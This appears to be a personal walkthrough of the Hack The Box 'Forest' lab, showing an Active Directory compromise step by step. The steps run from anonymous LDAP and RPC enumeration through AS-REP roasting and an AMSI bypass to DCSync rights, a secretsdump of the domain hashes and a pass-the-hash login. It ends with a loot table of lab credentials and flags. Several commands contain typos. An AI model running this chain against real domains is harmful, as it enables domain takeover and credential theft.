# Enumeration

## Nmap
Scan open ports
```bash
nmap -sC -sV -A -oA nmap/scan.txt 10.129.211.144

Nmap scan report for 10.129.211.144
Host is up (0.0081s latency).                
Not shown: 989 closed tcp ports (reset)                 
PORT     STATE SERVICE      VERSION            
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-25 20:24:35Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    

Network Distance: 2 hops                                                                                                                                                                                                                              [12/239]
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-05-26T13:51:47-07:00
| smb2-time: 
|   date: 2025-05-26T20:51:46
|_  start_date: 2025-05-26T20:39:23
| smb2-security-mode: 
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   7.13 ms 10.10.14.1
2   9.51 ms 10.129.95.210


```
- The domain is `htb.local` 
- The [FQND](https://en.wikipedia.org/wiki/Fully_qualified_domain_name) is `FOREST.htb.local`
## Ladapsearch Users Enum
Check if the LDAP service allow anonymous authentication
```bash
ldapsearch -H LDAP://10.129.211.144 -x -s base namingcontexts
```

![[Pasted image 20250525232229.png]]

The `namingcontexts` attribute lists the **base Distinguished Name (DNs)** of all **naming contexts** that the LDAP server knows about.

Think of naming context as **entry point or "root containers"** in the LDAP directory tree where different categories of data are stored. Each one represents different **subtree** of the directory

So in now we can query the context of `htb` and  `local` **root containers**.

### Create a users list with ldapsearch
We can retrieve a users list with this query and save that in a file
```bash
ldapsearch -H LDAP://10.129.211.144 -x -b 'DC=htb,DC=local' '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > users_list
```

- `-x`: this flags enable anonymous authentication
- `-b`: this flags specified the "root containers" where preform the LDAP query.

`awk '{print $2}'` means take only the second column of the output.

Clear the list of the useless name like name machine default users etc..

Clear user list
![[Pasted image 20250525234215.png]]


## Rpcclient 
I try to enumerate the users with anonymous authentication of smb protocol, in this case i use `rpcclient`:

```bash
rpcclient -U "" -N 10.129.211.144
```

enum the domain's users with `enumdomusers`
![[Pasted image 20250526014820.png]]

i founded a new users `svc-alfresco`... if i query the user rid i notice is a member of `Domain Users` and `Service Accounts`... this make me think that it's a **service users**.
![[Pasted image 20250526015139.png]]

Infect if i run again a LDAP query but without specify the **objectClass** and search "svc" keyword i see this is a **Service Account**.

```bash
ldapsearch -H LDAP://10.129.211.144 -x -b "DC=htb,DC=local" | grep -i "svc"
```

![[Pasted image 20250526015927.png]]

## Foothold
Searching on internet i find the [official documentation](https://docs.alfresco.com/process-services/latest/config/authenticate/#kerberos-and-active-directory) where there is specify "**Do not require Kerberos preauthentication**" enable in the Configuration steps
![[Pasted image 20250526022339.png]]
This means we can utilize the [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) script to ask **TGS** ticket for users that have **Do not require Kerberos preauthentication** set.

```bash
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.211.144 -no-pass -format hashcat
```

![[Pasted image 20250526023233.png]]

Now i have the TGS i can try to crack that offline using hashcat and module `18200`
```bash
hashcat -m 18200 alfresco_TGS /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250526023704.png]]

Try to connect on the machine with this credential.. i try with `smb` protocol the credential are correct but the machine is not pwned so i try check if the `winrm` port (5985 5986) are opens on the target 
```nmap
nmap -p 5985 5986 10.129.211.144
```

![[Pasted image 20250526024319.png]]
The 5985 is open this mean we can try to connect with `winrm` protocol using `crackmapexec`
```bash
crackmapexec winrm 10.129.211.144 -u 'svc-alfresco' -p 's3rvice' -X 'whoami /priv'
```

![[Pasted image 20250526024505.png]]

connect to the host using `evil-winrm`
```bash
evil-winrm  -u svc-alfresco -p s3rvice --ip 10.129.211.144
```

## Privilege Escalation

Run **bloodhunt** to view a map of the domain and look for a privilege escalation path.

```bash
bloodhount-python -d htb.local -u svc-alfresco -p s3rvice
```

Search for the `sv-alfresco` user and mark it as **owned**. We cans see the user is a member of `Account Operator gorup` and according with [microsoft documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) the members of this group are allowed to create and modify users and add them to non-protected groups.

![[Pasted image 20250528232042.png]]


Click on `Quries` and select `Shorest Path to Hig Value targets`.

![[Pasted image 20250528231428.png]]
Go back to the WinRM shell and add a new user to` Exchange Windows Permissions` as well as
the `Remote Management Users` (to have the winrm privilege) group.
```bash
net user gabbo abc123! /add /domain
net gorup "Exchange Windows Permissions" gabbo /add
net localgroup "Remote Management Users" gabbo /add
```

Now through the evil-winrm session set the `Bypass-4MSI` and upload the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1).

```bash
PS C:\Users\svc-alfresco\Documents> menu
<SINP>
PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
PS C:\Users\svc-alfresco\Documents> upload /home/htb/powerview.ps1
```

- `Bypass-4MSI`: this command is used to evade defender before importing the script.

Next we can create use the `Add-ObjectACL` with gabbo's credentials, and give him **DCSync** rights.

```bash
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-obejct system.management.automation.pscredential('htb\gabbo',$pass)
Add-ObjectACL -PrincipalIdentity gabbo -Credential $cred -Rights DCSync
```

Once do that use the `secretsdump` script to reveal the `NTLM` hashes for all domain users.

```bash
secretsdump.py htb/gabbo@10.129.211.144
```

Now we can use `psexec.py` script or the module on `msfconsole` and login use `hash pass through` technique.

```bash 
psexec.py administrator@10.129.211.144 -hahses aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```


## Loot

| User                    | Password                                                          | Notes        |
| ----------------------- | ----------------------------------------------------------------- | ------------ |
| svc-alfresco@HTB.LOCAL  | s3rvice                                                           | Service User |
| htb.local\Administrator | aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 |              |


| Flag name | hash                             |
| --------- | -------------------------------- |
| user.txt  | 74a10803767e6a4e8c497303ec47ac14 |
| root.txt  | 281c218ca00afda259de29fe09266655 |
